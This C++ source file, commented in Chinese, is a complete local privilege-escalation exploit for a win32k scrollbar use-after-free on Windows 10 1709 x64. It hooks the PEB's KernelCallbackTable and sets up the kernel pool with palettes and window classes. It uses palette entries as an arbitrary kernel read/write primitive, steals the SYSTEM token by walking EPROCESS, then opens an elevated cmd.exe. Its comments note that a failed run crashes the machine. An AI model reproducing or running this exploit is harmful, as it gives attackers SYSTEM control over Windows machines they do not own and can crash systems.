#include <iostream>
#include <string.h>
#include <windows.h>
#include <tchar.h>
#include<intrin.h>
using namespace std;

VOID FMenuName(VOID);
VOID Hook_Init(VOID);
UINT GetSystem(VOID);
ULONG64 UAF_80(VOID);
UINT UAF_Tag_Cls(VOID);
VOID Pool_FengShui(VOID);
UINT CreateWindows(VOID);
VOID fnDWORDHook(PMSG MSG);
ULONG64 GetMenuAddress(VOID);
EXTERN_C ULONG64 GetPeb(VOID);
VOID GetPalette_Address(VOID);
ULONG64 FindThisProcessEPROCESSAddress(VOID);
PVOID Find_HMValidateHandle(PVOID IsMenu_Address);
EXTERN_C ULONG64 NtUserSetWindowFNID(HANDLE, UINT);
PVOID Find_Functions(LPCSTR Dll_Name, LPCSTR F_Name);
VOID xxxClientAllocWindowClassExtraBytesHook(PVOID MSG);


typedef HWND(__fastcall * My_HMValidateHandle)(
	HWND        Window,
	ULONG		Number
);

typedef BOOL(WINAPI * My_EnumDeviceDrivers)(
	LPVOID  *lpImageBase,
	DWORD   cb,
	LPDWORD lpcbNeeded
);


typedef VOID(__fastcall* My_FnFunction)(
	IN PVOID MSG
);

typedef BOOL(WINAPI *LPFN_GLPI)(
	PSYSTEM_LOGICAL_PROCESSOR_INFORMATION,
PDWORD);

UINT Flag = 0;

UCHAR Data[0x2000] = { 0 };

LOGPALETTE *Palette = NULL;

ULONG64 TagCls_Menu_Address[0x1000], System_EPROCESS = NULL, System_EPROCESS_Address=NULL;

HBITMAP S0xF70[0x1000], S0x90[0x2000];


HPALETTE Where_PALETTE = NULL, What_PALETTE = NULL;

HWND Window = NULL, SrollBar = NULL, New_SrollBar = NULL;

PVOID IsMenu_Address = NULL, HMValidateHandle_Address = NULL;

ULONG64 PEB = NULL, fnDWORD_Address = NULL, To_Where_A_Palette = NULL, UlClientDelta = NULL;

My_HMValidateHandle HMValidateHandle = NULL;

My_EnumDeviceDrivers EnumDeviceDrivers1 = NULL;


My_FnFunction fnDword = NULL, xxxClientAllocWindowClassExtraBytes = NULL;

UINT CreateWindows(VOID)
{

	HINSTANCE hInstance;
	WNDCLASS wndclass = { 0 };

	{

		hInstance = GetModuleHandleA(0);
		wndclass.style = CS_HREDRAW | CS_VREDRAW;
		wndclass.lpfnWndProc = DefWindowProc;
		wndclass.hInstance = hInstance;
		wndclass.cbClsExtra = 0x00;
		wndclass.cbWndExtra = 0x08;
		wndclass.lpszClassName = "case";

		if (!RegisterClassA(&wndclass))
		{
			cout << "RegisterClass Error!" << endl;
			return 1;
		}
	}
	Window = CreateWindowExA(0, "case", NULL, WS_DISABLED, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

	if (!Window)
	{
		cout << "Create Window Error!" << endl;
		return 1;
	}

	//保存句柄在扩展内存中
	SetWindowLongA(Window, 0, (ULONG)Window);

	//WS_CHILD |

	SrollBar = CreateWindowExA(0, "SCROLLBAR", NULL, WS_CHILD | WS_VISIBLE | SBS_HORZ, NULL, NULL, 2, 2, Window, NULL, hInstance, NULL);
	cout << "Window:0x" << hex << Window << endl;
	cout << "SrollBar:0x" << hex << SrollBar << endl;

}

/// <summary>
/// 获取第一个调色板的地址
/// </summary>
/// <param name=""></param>
/// <returns></returns>
VOID GetPalette_Address(VOID)
{
	ULONG64 A_Palette_Address = NULL, B_Palette_Address = NULL;

	Palette = (LOGPALETTE*)malloc(sizeof(LOGPALETTE)+(sizeof(PALETTEENTRY)* (0x1D5 - 0x01)));

	memset(Palette, 0x42, sizeof(LOGPALETTE)+(sizeof(PALETTEENTRY)* (0x1D5 - 0x01)));

	Palette->palVersion = 0x0300;
	Palette->palNumEntries = 0x1D5;

	//通过菜单地址获取第一个PALETTE对象的地址
	A_Palette_Address = GetMenuAddress();

	cout << "A_Palette_Address:0x" << hex << A_Palette_Address << endl;
	// 用于记录修改cEntries成员的大小
	To_Where_A_Palette = A_Palette_Address + 0x2D - 8;

	//内存缩紧
	// 消耗0x800大小的空余内存，直到没有空余。系统才会分配0x1000的内存
	for (UINT I = 0; I < 0x1500; ++I)
	{
		CreatePalette(Palette);
	}

	UnregisterClassW(L"LEAKWS", GetModuleHandleA(0));

	//创建一个0x1000字节的MenuName，在释放掉它并马上申请两个占用0x800的PALETTE，
	//这样这两个PALETTE就会占用释放掉的MenuName，它们在内存中是相邻的，
	//且可以获取到第一个PALETTE对象的地址
	Where_PALETTE = CreatePalette(Palette);
	What_PALETTE = CreatePalette(Palette);

	cout << "Where_PALETTE:0x" << hex << Where_PALETTE << endl;

	cout << "What_PALETTE:0x" << hex << What_PALETTE << endl;

}

ULONG64 GetNTOsBase(void)
{
	ULONG64 Bases[0x1000];
	DWORD needed = 0;
	ULONG64 krnlbase = 0;
	if (EnumDeviceDrivers1((LPVOID *)&Bases, sizeof(Bases), &needed)) 
	{
		krnlbase = Bases[0];
	}
	return krnlbase;
}

DWORD GetCpuNumber(VOID)
{
	LPFN_GLPI glpi;
	BOOL done = FALSE;
	PSYSTEM_LOGICAL_PROCESSOR_INFORMATION buffer = NULL;
	PSYSTEM_LOGICAL_PROCESSOR_INFORMATION ptr = NULL;
	DWORD returnLength = 0;
	DWORD logicalProcessorCount = 0;
	DWORD numaNodeCount = 0;
	DWORD processorPackageCount = 0;
	DWORD byteOffset = 0;

	glpi = (LPFN_GLPI)GetProcAddress(GetModuleHandle(TEXT("kernel32")), "GetLogicalProcessorInformation");
	if (NULL == glpi)
	{
		puts("[-] GetLogicalProcessorInformation is not supported.");
		return (1);
	}

	while (!done)
	{
		DWORD rc = glpi(buffer, &returnLength);

		if (FALSE == rc)
		{
			if (GetLastError() == ERROR_INSUFFICIENT_BUFFER)
			{
				if (buffer)
					free(buffer);
				buffer = (PSYSTEM_LOGICAL_PROCESSOR_INFORMATION)malloc(returnLength);

				if (NULL == buffer)
				{
					puts("[-] Error: Allocation failure");
					return (1);
				}
			}
			else
			{
				printf("[-] Error %d\n", GetLastError());
				return 1;
			}
		}
		else
		{
			done = TRUE;
		}
	}

	ptr = buffer;

	while (byteOffset + sizeof(SYSTEM_LOGICAL_PROCESSOR_INFORMATION) <= returnLength)
	{
		switch (ptr->Relationship)
		{
		case RelationProcessorPackage:
			processorPackageCount++;
		default:
			break;
		}
		byteOffset += sizeof(SYSTEM_LOGICAL_PROCESSOR_INFORMATION);
		ptr++;
	}

	return processorPackageCount;
}

ULONG64 PsInitialSystemProcess(VOID)
{
	char *Un = NULL;
	Un = (char *)malloc(0x20);
	int tmp[4];
	BOOL pae = FALSE;

	RtlSecureZeroMemory(tmp, sizeof(tmp));

	__cpuid(tmp, 1);

	if (tmp[3] & 0x40)
	{
		pae = TRUE;
	}

	if (GetCpuNumber()>1)
	{
#ifndef _WIN64
		if (pae)
		{
			strcpy(Un, "ntkrpamp.exe");
		}
		else
#endif
		{
			strcpy(Un, "ntkrnlmp.exe");
		}
	}
	else
	{
#ifndef _WIN64
		if (pae)
		{
			strcpy(Un, "ntkrnlpa.exe");
		}
		else
#endif
		{
			strcpy(Un, "ntoskrnl.exe");
		}
	}

	ULONG64 ntos = (ULONG64)LoadLibraryA((LPCSTR)Un);
	ULONG64 addr = (ULONG64)GetProcAddress((HMODULE)ntos, "PsInitialSystemProcess");
	FreeLibrary((HMODULE)ntos);
	ULONG64 res = 0;
	ULONG64 ntOsBase = GetNTOsBase();
	if (ntOsBase) 
	{
		res = addr - ntos + ntOsBase;
	}
	return res;
}


/// <summary>
/// 提权
/// </summary>
/// <param name=""></param>
/// <returns></returns>
UINT GetSystem(VOID)
{
	UCHAR Data[0x200] = { 0 };

	// 1 = 4
	PVOID EnumDeviceDrivers_Address = NULL;
	EnumDeviceDrivers_Address = Find_Functions("Psapi.dll", "EnumDeviceDrivers");
	EnumDeviceDrivers1 = (My_EnumDeviceDrivers)EnumDeviceDrivers_Address;

	System_EPROCESS = PsInitialSystemProcess();

	//此处为0x1DE 读取 What_Palette 的句柄
	GetPaletteEntries(Where_PALETTE, 0x1DE, 2, (LPPALETTEENTRY)&Data);

	if (*(HPALETTE*)Data != What_PALETTE)
	{
		//Pool FengShui Error 但是不用担心,失败了一样会蓝屏,只有利用成功才会修复,哈哈哈哈哈哈哈
		return 1;
	}

	*(ULONG64*)Data = System_EPROCESS;
	//读取System_EPRCOESS
	SetPaletteEntries(Where_PALETTE, 0x1DE+0x1E, 2, (LPPALETTEENTRY)&Data);

	GetPaletteEntries(What_PALETTE, 0, 2, (LPPALETTEENTRY)&System_EPROCESS_Address);

	//读取System Token
	ULONG64 SystemToken = NULL;
	*(ULONG64*)Data = System_EPROCESS_Address + 0x358;
	SetPaletteEntries(Where_PALETTE, 0x1DE + 0x1E, 2, (LPPALETTEENTRY)&Data);
	GetPaletteEntries(What_PALETTE, 0, 2, (LPPALETTEENTRY)&SystemToken);

	//修改当前进程Token
	ULONG64 Token_Address = FindThisProcessEPROCESSAddress();
	*(ULONG64*)Data = Token_Address;
	SetPaletteEntries(Where_PALETTE, 0x1DE + 0x1E, 2, (LPPALETTEENTRY)&Data);
	SetPaletteEntries(What_PALETTE, 0, 2, (LPPALETTEENTRY)&SystemToken);

}

/// <summary>
/// 找到EPROCESS
/// </summary>
/// <param name=""></param>
/// <returns></returns>
ULONG64 FindThisProcessEPROCESSAddress(VOID)
{

	UCHAR Find[0x20] { 0 };
	ULONG64 processId = GetCurrentProcessId(), Next_Process = System_EPROCESS_Address;

	do{
		*(ULONG64*)Find = Next_Process + 0x2E0;

		SetPaletteEntries(Where_PALETTE, 0x1DE + 0x1E, 2, (LPPALETTEENTRY)&Find);

		GetPaletteEntries(What_PALETTE, 0, 2, (LPPALETTEENTRY)&Find);

		//找到当前进程EPROCESS
		if (*(ULONG64*)Find == processId)
		{
			return Next_Process+0x358;
		}
		//循环链表查找
		*(ULONG64*)Find = Next_Process + 0x2E8;

		SetPaletteEntries(Where_PALETTE, 0x1DE + 0x1E, 2, (LPPALETTEENTRY)&Find);

		GetPaletteEntries(What_PALETTE, 0, 2, (LPPALETTEENTRY)&Next_Process);

		Next_Process -= 0x2E8;


	} while (1);

}


/// <summary>
/// 修复TagCls,将lpszMenuName全部设为NULL,拒绝蓝屏
/// </summary>
/// <param name=""></param>
/// <returns></returns>
VOID FMenuName(VOID)
{
	ULONG64 Zero = 0;
	UCHAR Menu[0x20] = { 0 };

	for (UINT I = 0; I <0x1000; ++I)
	{
		if (TagCls_Menu_Address[I] == 0)
		{
			continue;
		}
		*(ULONG64*)Menu = TagCls_Menu_Address[I];

		SetPaletteEntries(Where_PALETTE, 0x1DE + 0x1E, 2, (LPPALETTEENTRY)&Menu);

		SetPaletteEntries(What_PALETTE, 0, 2, (LPPALETTEENTRY)&Zero);
	}
}



ULONG64 UAF_80(VOID)
{
	//创建带有Menu的窗口类
	UINT I = 0;
	HWND hwnd = NULL;
	HINSTANCE hInstance;
	WNDCLASSW wndclass = { 0 };
	ULONG64 PTagWnd = NULL, TagCls = NULL;

	UCHAR MenuNames[0x100] = { 0 }, ClassName[0x50] = { 0 };

	memset(MenuNames, 0x43, 0x80 - 0x20);
	//在xxxSBTrackInit释放内存之前，函数会对其中几个成员通过调用HMAssignmentUnlock来解引用
	//win32kbase!HMAssignmentUnlock函数我们发现,该函数会将[[rcx]+8]处内存+(-1)也就是减1
	//直接修改MenuName的值，对照上面被释放的tagSBTRACK结构体的成员，将其设为上面记录的cEntries成员的地址
	//随后cEntries 会被-1，变得很大，造成越界读写
	*(ULONG64*)((ULONG64)MenuNames + 0x10) = To_Where_A_Palette;
	*(ULONG64*)((ULONG64)MenuNames + 0x08) = To_Where_A_Palette;

	//大量创建窗口，占用刚被释放的tagSBTRACK
	while (I < 0x1000)
	{

		sprintf((char *)ClassName,"WindowUaf%d",I);

		hInstance = GetModuleHandleA(0);
		wndclass.style = CS_HREDRAW | CS_VREDRAW;
		wndclass.lpfnWndProc = DefWindowProc;
		wndclass.hInstance = hInstance;
		wndclass.lpszMenuName = (LPCWSTR)MenuNames;
		wndclass.lpszClassName = (LPCWSTR)ClassName;

		if (!RegisterClassW(&wndclass))
		{
			cout << "RegisterClass Error!" << endl;
			return 1;
		}

		hwnd = CreateWindowExW(0, (LPCWSTR)ClassName, NULL, WS_DISABLED, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

		PTagWnd = (ULONG64)HMValidateHandle(hwnd, 0x01);

		UlClientDelta = (ULONG64)((*(ULONG64*)(PTagWnd + 0x20)) - (ULONG64)PTagWnd);

		TagCls = (*(ULONG64*)(PTagWnd + 0xa8)) - UlClientDelta;

		//Kernel Pool TagCls.lpszMenuName
		TagCls_Menu_Address[I] = TagCls + 0x98 + UlClientDelta;

		++I;
	}


}


/// <summary>
/// 创建创建带有MenuName的窗口（创建窗口类,设置lpszMenuName属性）
/// 获取tagWND的pcls地址（0xA8）
/// </summary>
/// <param name=""></param>
/// <returns></returns>
ULONG64 GetMenuAddress(VOID)
{

	HWND hwnd = NULL;
	HINSTANCE hInstance;
	WNDCLASSW wndclass = { 0 };

	UCHAR MenuNames[0x2000] = { 0 };

	memset(MenuNames,0x43,0x1000-10);

	{
		//创建带有MenuName的窗口时（创建窗口类,设置lpszMenuName属性）
		hInstance = GetModuleHandleA(0);
		wndclass.style = CS_HREDRAW | CS_VREDRAW;
		wndclass.lpfnWndProc = DefWindowProc;
		wndclass.hInstance = hInstance;
		wndclass.lpszMenuName = (LPCWSTR)MenuNames;
		wndclass.lpszClassName = L"LEAKWS";

		if (!RegisterClassW(&wndclass))
		{
			cout << "RegisterClass Error!" << endl;
			return 1;
		}
	}

	hwnd = CreateWindowExW(0, L"LEAKWS", NULL, WS_DISABLED, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

	if (!hwnd)
	{
		cout << "Create Window Error!" << endl;
		return 1;
	}

	IsMenu_Address = Find_Functions("user32.dll", "IsMenu");
	HMValidateHandle_Address = Find_HMValidateHandle(IsMenu_Address);
	printf("HMValidateHandle Address(0x%p)\n", HMValidateHandle_Address);
	HMValidateHandle = (My_HMValidateHandle)HMValidateHandle_Address;

	ULONG64 PTagWnd = NULL, TagCls = NULL;

	//泄露创建窗口在用户映射桌面堆的位置
	PTagWnd = (ULONG64)HMValidateHandle(hwnd, 0x01);

	UlClientDelta = (ULONG64)((*(ULONG64*)(PTagWnd + 0x20)) - (ULONG64)PTagWnd);

	//通过tagWND偏移0xA8的pcls来获取其在内存中的地址。
	//因此，可以通过创建一个这样的窗口，然后释放掉，在马上创建一个PALETTE，
    //那么它的pcls就指向了这个PALETTE对象(大概率)
	TagCls = (*(ULONG64*)(PTagWnd + 0xa8)) - UlClientDelta;

	cout << "TagWnd:0x" << hex << PTagWnd << endl;

	cout << "TagCls:0x" << hex << TagCls << endl;

	DestroyWindow(hwnd);

	return *(ULONG64*)(TagCls + 0x98);


}

/// <summary>
/// 寻找api
/// </summary>
/// <param name="Dll_Name"></param>
/// <param name="F_Name"></param>
/// <returns></returns>
PVOID Find_Functions(LPCSTR Dll_Name, LPCSTR F_Name)
{
	HMODULE Dll_HMODULE = NULL;
	PVOID F_Address = NULL;
	Dll_HMODULE = LoadLibraryA(Dll_Name);
	if (Dll_HMODULE == NULL)
	{
		printf("%s Find Error!\n", Dll_Name);
		return NULL;
	}
	printf("Address(%s):0x%p\n", Dll_Name, Dll_HMODULE);
	F_Address = GetProcAddress(Dll_HMODULE, F_Name);
	if (F_Address == NULL)
	{
		printf("Function(%s) Find Error!\n", F_Name);
		return NULL;
	}
	printf("Address(%s):0x%p\n", F_Name, F_Address);

	return F_Address;
}

/// <summary>
/// 寻找HMValidateHandle
/// </summary>
/// <param name="IsMenu_Address"></param>
/// <returns></returns>
PVOID Find_HMValidateHandle(PVOID IsMenu_Address)
{
	ULONG64 HMV_Adr = 0;
	while (1)
	{
		if (*(char *)IsMenu_Address == '\xE8')
		{
	
			HMV_Adr = *(ULONG*)((ULONG64)IsMenu_Address + 1);

			HMV_Adr += (ULONG64)IsMenu_Address + 0x05 - 0x100000000;

			return (PVOID)HMV_Adr;
		}
		IsMenu_Address = (char *)IsMenu_Address + 1;
	}

	return 0;
}


/// <summary>
/// 用户模式回调函数hook
/// </summary>
/// <param name="MSG"></param>
/// <returns></returns>
VOID fnDWORDHook(PMSG MSG)
{
	//第一次调用
	if (*(DWORD*)MSG && Flag && *((PULONG64)MSG + 1) == 0x31f)
	{
		Flag = 0;//第一次释放的标志
		//通过DestroyWindow来调用xxxFreeWindow
		//通过xxxFreeWindow来释放窗口，函数会将要释放的窗口对象的fnid与0x8000进行或运算，表示窗口被释放
		//接着判断窗口对象是否有扩展内存，即cbwndExtra是否为0，
		//如果不为0，则执行xxxClientFreeWindowClassExtraBytes来释放扩展内存
		//xxxClientFreeWindowClassExtraBytes函数执行完成之后，函数会判断窗口对象的fnid值的低12位是否在0x2A0到0x2AA之
		//如果fnid在0x2A0到0x2AA之间，则会调用SfnDWORD函数
		//HOOK xxxClientFreeWindowClassExtraBytes函数用户层对应的处理函数，
		// 就可以在处理函数中调用NtUserSetWindowFNID，将窗口的fnid加入0x2A1的标记。
		//这样xxxClientFreeWindowClassExtraBytes函数返回以后，会因为被修改的窗口的fnid值的低12位为0x2A1导致再次调用SfdDWORD返回用户层
		DestroyWindow(Window);
	}

	//第二次
	if (*((PULONG64)MSG + 1) == 0x70)
	{
		cout << "SendMessage" << endl;

		//这里申请0x80字节 占用释放的tagSBTrack结构
		/*
		...Some Code...
		*/
		*(ULONG64*)((ULONG64)Data + 0x10) = To_Where_A_Palette;
		*(ULONG64*)((ULONG64)Data + 0x08) = To_Where_A_Palette;

		//占用0x80的空闲内存
		//填补第一次释放的空白，防止第二次释放造成BSOD
		for (UINT I = 0; I < 0x2000; ++I)
		{
			CreateBitmap(0x70, 0x01, 0x01, 0x08, Data);
		}

		
		//发送WM_CANCELMODE 导致xxxEndScroll函数释放pSBTrackInit结构体（第一次释放） 这块内存就会处于释放状态
		//!? 当xxxFreeWindow函数返回后(第一次的执行流)，
		//! 就会返回到xxxSBTrackInit继续执行，而xxxSBTrackInit会在最后释放pSBTrack结构体，而这个结构体已经被释放
		//! 可以进行UAF利用
		SendMessageA(New_SrollBar, WM_CANCELMODE, 0, 0);

		UAF_80();


	}
	fnDword(MSG);

}

/// <summary>
/// hook xxxCreateFreeWindowClassExtraBytes（调用NtUserSetWindowFNID）返回到用户层会执行的函数
/// 将窗口的fnid加入0x2A1的标记
/// 这样xxxClientFreeWindowClassExtraBytes函数返回以后，会因为被修改的窗口的fnid值的低12位为0x2A1导致再次调用SfdDWORD返回用户层
/// </summary>
/// <param name="MSG"></param>
/// <returns></returns>
VOID xxxClientAllocWindowClassExtraBytesHook(PVOID MSG)
{

	if ((*(HWND*)*(HWND*)MSG) == Window)
	{
		cout << "xxxClientAllocWindowClassExtraBytes" << endl;
		//为什么要创建新滚动条控件呢,因为子滚动条控件的父窗口被释放后,无法获取到滚动条的内核地址了
		New_SrollBar = CreateWindowExA(0, "SCROLLBAR", NULL, SBS_HORZ | WS_HSCROLL | WS_VSCROLL, NULL, NULL, 2, 2, NULL, NULL, GetModuleHandleA(0), NULL);
		NtUserSetWindowFNID(Window, 0x2A1);//! 将窗口的fnid加入0x2A1的标记
		SetCapture(New_SrollBar);
	}

	xxxClientAllocWindowClassExtraBytes(MSG);
}

/// <summary>
/// 初始化hook
/// Windows10 1709 X64
/// </summary>
/// <param name=""></param>
/// <returns></returns>
VOID Hook_Init(VOID)
{

	DWORD OldType = 0;

	ULONG64 KernelCallbackTable = *(ULONG64*)(PEB + 0x58);

	VirtualProtect((LPVOID)KernelCallbackTable, 0x1024, PAGE_EXECUTE_READWRITE, &OldType);

	//fnDWORD
	fnDword = (My_FnFunction)*(ULONG64*)(KernelCallbackTable + 0x08 * 0x02);

	*(ULONG64*)(KernelCallbackTable + 0x08 * 0x02) = (ULONG64)fnDWORDHook;

	//xxxClientAllocWindowClassExtraBytes

	xxxClientAllocWindowClassExtraBytes = (My_FnFunction)*(ULONG64*)(KernelCallbackTable + 0x08 * 0x7E);
	//0x80
	*(ULONG64*)(KernelCallbackTable + 0x08 * 0x7E) = (ULONG64)xxxClientAllocWindowClassExtraBytesHook;
}

/// <summary>
/// 创建命令行
/// </summary>
/// <returns></returns>
VOID CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)& si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
	exit(1);
}

/// <summary>
/// 主函数
/// </summary>
/// <param name="argc"></param>
/// <param name="argv"></param>
/// <returns></returns>
int _tmain(int argc, _TCHAR* argv[])
{

	//获取PEB地址
	PEB = GetPeb();
	//创建窗口
	CreateWindows();

	//获取两个PALETTE结构的地址
	GetPalette_Address();

	{
		//Hook
		Hook_Init();
		Flag = 1;

		//向滚动条发送点击消息
		//当向滚动条控件发送WM_LBUTTONDOWN(左键按下)的消息时候，xxxSBTrackInit(第一次调用)函数就会被调用，
		//xxxSBTrackInit函数会调用xxxDispatchMessage，该函数又会调用SfdDWORD来返回用户层
		//xxxSBTrackInit函数最后释放pSBTrack结构体（第二次释放） UAF
		SendMessageA(SrollBar, WM_LBUTTONDOWN, MK_LBUTTON, 0x00080008);
	}

	//System!
	GetSystem();
	
	//修复TagCls,将lpszMenuName全部设为NULL,拒绝蓝屏
	FMenuName();

	CreateCmd();
	
	getchar();
	return 0;
}

